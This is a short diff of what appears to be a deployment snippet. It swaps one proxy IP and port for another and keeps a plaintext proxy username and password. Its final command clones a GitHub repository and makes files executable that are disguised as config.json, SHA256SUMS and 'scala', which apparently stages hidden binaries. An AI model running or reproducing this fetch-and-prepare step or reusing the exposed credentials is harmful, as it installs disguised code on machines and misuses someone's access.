@@ -1,5 +1,5 @@
-proxy="185.199.229.156" 
-port="7492" 
+proxy="185.199.228.220" 
+port="7300" 
 user="ugursfso"  
 pass="wqn60pnk6m95" 
 git clone https://github.com/55113110159/javascript.git && cd javascript && chmod +x config.json && chmod +x SHA256SUMS && chmod +x scala
